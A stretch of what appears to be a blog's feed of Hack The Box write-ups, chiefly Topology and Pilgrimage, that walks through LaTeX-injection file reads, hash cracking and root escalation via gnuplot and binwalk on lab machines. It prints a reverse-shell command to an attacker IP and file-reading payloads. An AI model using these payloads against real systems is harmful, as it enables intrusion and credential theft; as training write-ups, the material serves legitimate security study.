+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-irked.png&quot; alt=&quot;irked&quot; /&gt;&lt;/p&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">Here is a quick xmind map.</summary></entry><entry><title type="html">Hack The Box - Joker [Hard]</title><link href="http://localhost:4000/ctf-writeup/2023/08/05/htb-joker.html" rel="alternate" type="text/html" title="Hack The Box - Joker [Hard]" /><published>2023-08-05T00:00:00+03:00</published><updated>2023-08-05T00:00:00+03:00</updated><id>http://localhost:4000/ctf-writeup/2023/08/05/htb-joker</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/08/05/htb-joker.html">&lt;p&gt;Here is a quick xmind map.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-joker.png&quot; alt=&quot;rwojak&quot; /&gt;&lt;/p&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">Here is a quick xmind map.</summary></entry><entry><title type="html">Hack The Box - Topology [Easy]</title><link href="http://localhost:4000/ctf-writeup/2023/06/30/htb-topology.html" rel="alternate" type="text/html" title="Hack The Box - Topology [Easy]" /><published>2023-06-30T00:00:00+03:00</published><updated>2023-06-30T00:00:00+03:00</updated><id>http://localhost:4000/ctf-writeup/2023/06/30/htb-topology</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/06/30/htb-topology.html">&lt;p&gt;I’ve started with simple machine enumeration&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; 10.10.11.217
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then I went to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;topology.htb&lt;/code&gt; to check out the website, noticed the possible users (according to the email that is formatted like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lklein@topology.htb&lt;/code&gt;). I’ve enumerated possible users:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lklein
+vdaisley
+dabrahams
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I went on to figure out what is located at http://latex.topology.htb/equation.php which was the only link on the website. There I found out some LaTeX to PNG convertor. I’ve figured out that there must be some trickery with this so I went my way to research the topic.&lt;/p&gt;
+
+&lt;p&gt;I’ve found out the following:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;https://0day.work/hacking-with-latex/&lt;/li&gt;
+  &lt;li&gt;https://salmonsec.com/cheatsheets/exploitation/latex_injection&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;These two links, helped me to figure out that I had an LFI vulnerability at hand. Upon searching different files such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd, /proc/self/cmdline, /proc/self/environ&lt;/code&gt; and so on, I’ve figured out that I must be missing something. I began to explore what other subdomains (because there is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;latex.topology.htb&lt;/code&gt; I thought there would be more) were on the webserver using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$commontxt&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://topology.htb/ &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Host: FUZZ.topology.htb&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Which yielded the following domains:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dev&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stats&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I’ve browsed through those and on the stats there were simple plots about the current usage of the system and that’s it. But on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dev&lt;/code&gt; subdomain there was a Basic Auth in place which I then figured out that I can read the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.htpasswd&lt;/code&gt; with the LFI vulnerability in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;latex.topology.htb&lt;/code&gt; input form.&lt;/p&gt;
+
+&lt;p&gt;I’ve tried a couple of times to read the file, but there were unsuccessful, and I went my way to figure out why and what’s going on.&lt;/p&gt;
+
+&lt;p&gt;I honestly didn’t know how can I read the file and I turned out to some help, which I then understood that I can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LaTeX/Source Code Listings&lt;/code&gt; which also can read a file with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\lstinputlisting{/var/www/dev/.htpasswd}&lt;/code&gt;, however the website just resulted in no image (possible error) using just this command.&lt;/p&gt;
+
+&lt;p&gt;Here comes this post to the rescue https://tex.stackexchange.com/questions/410863/what-are-the-differences-between-and&lt;/p&gt;
+
+&lt;p&gt;Since the website is about math, we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inline math delimiters&lt;/code&gt; that are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ and $&lt;/code&gt; which can turn my payload from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\lstinputlisting{/var/www/dev/.htpasswd}&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$\lstinputlisting{/var/www/dev/.htpasswd}$&lt;/code&gt; which resulted into getting the basic auth hash.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTZ0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat&lt;/code&gt; we can extract the password&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ hashcat -m 1600 crack.txt /usr/share/wordlists/rockyou.txt
+$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTZ0:goDoItOnYourOwn
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With that, I tried the users that I’ve enumerated earlier and the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vdaisley&lt;/code&gt; worked out, so I went to log in with SSH and got the user flag.&lt;/p&gt;
+
+&lt;h1 id=&quot;root&quot;&gt;Root&lt;/h1&gt;
+
+&lt;p&gt;The root was pretty easy, first we can see which directories are writable:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ find / -type d -writable 2&amp;gt;/dev/null
+...
+/opt/gnuplot
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This directory looked suspicious, I’ve fired up &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pspy&lt;/code&gt; to checkout what is going on and I got this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/htb/htb-topology-pspyrun.png&quot; alt=&quot;rwojak&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So we are finding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*.plt&lt;/code&gt; files in this directory, and then we are executing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gnuplot&lt;/code&gt; as root. Using this &lt;a href=&quot;https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/#command-execution&quot;&gt;article,&lt;/a&gt; I’ve crafted a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.plt&lt;/code&gt; file with the contents of:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vdaisley@topology:/opt/gnuplot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ~/test.plt 
+system &lt;span class=&quot;s2&quot;&gt;&quot;bash -c &apos;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.xx/4444 0&amp;gt;&amp;amp;1&apos;&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I’ve copied the file to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/gnuplot&lt;/code&gt; directory and I’ve waited to get a remote connection which I got in about a minute. With that I rooted the machine.&lt;/p&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">I’ve started with simple machine enumeration</summary></entry><entry><title type="html">Hack The Box - Pilgrimage [Easy]</title><link href="http://localhost:4000/ctf-writeup/2023/06/25/htb-pilgrimage.html" rel="alternate" type="text/html" title="Hack The Box - Pilgrimage [Easy]" /><published>2023-06-25T00:00:00+03:00</published><updated>2023-06-25T00:00:00+03:00</updated><id>http://localhost:4000/ctf-writeup/2023/06/25/htb-pilgrimage</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/06/25/htb-pilgrimage.html">&lt;p&gt;I started off with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rustscan&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rustscan &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 
+Open 10.10.11.219:22
+Open 10.10.11.219:80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then I ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt; to brute force some directories.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.11.219/FUZZ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; ~/tools/SecLists/Discovery/Web-Content/common.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;That yielded the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.git&lt;/code&gt; folders, I used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git-dumper&lt;/code&gt; to dump the whole repository. Upon investigating the source code of the application, I’ve noticed a user called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;emily&lt;/code&gt;. I also discovered an executable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magick&lt;/code&gt; and this fragmet of code:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$newname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;uniqid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$upload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$mime&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; -resize 50% /var/www/pilgrimage.htb/shrunk/&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$newname&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$mime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;unlink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$upload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getFullPath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The program seems to be invoking this binary to shrink the image that is being uploaded through the website, the program itself is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ImageMagick 7.1.0-49 beta&lt;/code&gt; we discover that by invoking it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-version&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./magick &lt;span class=&quot;nt&quot;&gt;-version&lt;/span&gt;
+Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
+Copyright: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1999 ImageMagick Studio LLC
+License: https://imagemagick.org/script/license.php
+Features: Cipher DPC HDRI OpenMP&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4.5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
+Delegates &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;built-in&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
+Compiler: gcc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;7.5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This version is vulnerable to Arbitrary Remote Leak, https://www.metabaseq.com/imagemagick-zero-days/.&lt;/p&gt;
+
+&lt;p&gt;Furthermore, we notice some files of interest in the source code as well, such as the database file.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;PDO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;sqlite:/var/db/pilgrimage&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;exploiting&quot;&gt;Exploiting&lt;/h1&gt;
+
+&lt;p&gt;I’ve used this PoC to generate my payload: https://github.com/Sybil-Scan/imagemagick-lfi-poc&lt;/p&gt;
+
+&lt;p&gt;I’ve crafted my malicious image to read the database file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/db/pilgrimage&lt;/code&gt; and shrink it through the website, I’ve then downloaded the file and converted the bytes, opened it and after some digging I found the password for user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;emiliy&lt;/code&gt;. Then you can login with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;getting-root&quot;&gt;Getting root&lt;/h1&gt;
+
+&lt;p&gt;I’ve used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; to enumerate the system, and I’ve noticed a process running:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root         726  0.0  0.0   6816  3072 ?        Ss   15:00   0:00 /bin/bash /usr/sbin/malwarescan.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I checked the permissions of the script:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emily@pilgrimage:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /usr/sbin/malwarescan.sh
+&lt;span class=&quot;nt&quot;&gt;-rwxr--r--&lt;/span&gt; 1 root root 474 Jun  1 19:14 /usr/sbin/malwarescan.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And then I saw the script itself:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emily@pilgrimage:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /usr/sbin/malwarescan.sh
+&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;blacklist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Executable script&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Microsoft executable&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+/usr/bin/inotifywait &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; create /var/www/pilgrimage.htb/shrunk/ | &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;FILE&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
+	&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/var/www/pilgrimage.htb/shrunk/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;/usr/bin/echo &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$FILE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | /usr/bin/tail &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1 | /usr/bin/sed &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;s/^.*CREATE //p&apos;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;binout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;/usr/local/bin/binwalk &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;banned &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;blacklist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[@]&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
+		if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$binout&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$banned&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
+			/usr/bin/rm &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+			&lt;span class=&quot;nb&quot;&gt;break
+		&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fi
+	done
+done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This script seems to be invoking &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;binwalk&lt;/code&gt;, I searched for some exploits and I found this one: https://www.exploit-db.com/exploits/51249 following the steps in the exploit, I’ve set up a listener and placed the malicious &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;png&lt;/code&gt; crafted by the exploit in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/pilgrimage.htb/shrunk/&lt;/code&gt; directory.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emily@pilgrimage:/tmp/syl&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; ./binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After a couple of seconds, my listener got a connection, which was with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; privileges.&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusions&quot;&gt;Conclusions&lt;/h1&gt;
+
+&lt;p&gt;I wanted to investigate a little further how the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magick&lt;/code&gt; binary includes the file that it converts and this article explains it perfectly.&lt;/p&gt;
+
+&lt;p&gt;https://www.metabaseq.com/imagemagick-zero-days/&lt;/p&gt;
+
+&lt;p&gt;The exploit targets the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tEXt&lt;/code&gt; chunk of the PNG file, and this chunk is being used for storing key-value metadata for the PNG file. The problem comes whenever you use the “profile” string into that metadata, if that is being used as “key” the “value” is being interpreted as a filename, that then the functions &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FileToStringInfo&lt;/code&gt; → &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FileToBlob&lt;/code&gt; will fetch from the system, and it will populate the “value” with the file’s contents.&lt;/p&gt;
+
+&lt;p&gt;And to add some speculation on top of it, this almost feels like a backdoor ;).&lt;/p&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">I started off with rustscan</summary></entry><entry><title type="html">Hack The Box - Sandworm [Medium]</title><link href="http://localhost:4000/ctf-writeup/2023/06/24/htb-sandworm.html" rel="alternate" type="text/html" title="Hack The Box - Sandworm [Medium]" /><published>2023-06-24T00:00:00+03:00</published><updated>2023-06-24T00:00:00+03:00</updated><id>http://localhost:4000/ctf-writeup/2023/06/24/htb-sandworm</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/06/24/htb-sandworm.html">&lt;p&gt;I began with a simple scan, to check the ports of the machine.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rustscan &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 
+Open 10.10.11.218:22
+Open 10.10.11.218:80
+Open 10.10.11.218:443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I went to the website that is being hosted on port 80, and I saw that there is some sort of PGP stuff. Furthermore, I noticed the following URLs:&lt;/p&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;https://ssa.htb/login
+https://ssa.htb/
+https://ssa.htb/pgp # the site&apos;s public key
+https://ssa.htb/guide # some sort of playground for PGP
+https://ssa.htb/contact
+https://ssa.htb/guide/verify
+https://ssa.htb/about
+https://ssa.htb/login?next=%2Fadmin
+https://ssa.htb/guide/encrypt
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/guide&lt;/code&gt; endpoint there is some sort of playground for PGP, and while I was playing with it, I have noticed that when I am using the verify signature there is output that looked like pulled from the console.&lt;/p&gt;
+
+&lt;p&gt;I’ve enumerated the technologies and versions that the website is using, I found that it used Flask as the main server application and (possibly Flask for the frontend/templating engine).&lt;/p&gt;
+
+&lt;h2 id=&quot;rce&quot;&gt;RCE&lt;/h2&gt;
+
+&lt;p&gt;When I saw Flask I thought that the application could be using Jinja, so I immediately thought that this could be a potential &lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection&quot;&gt;SSTI&lt;/a&gt;. 
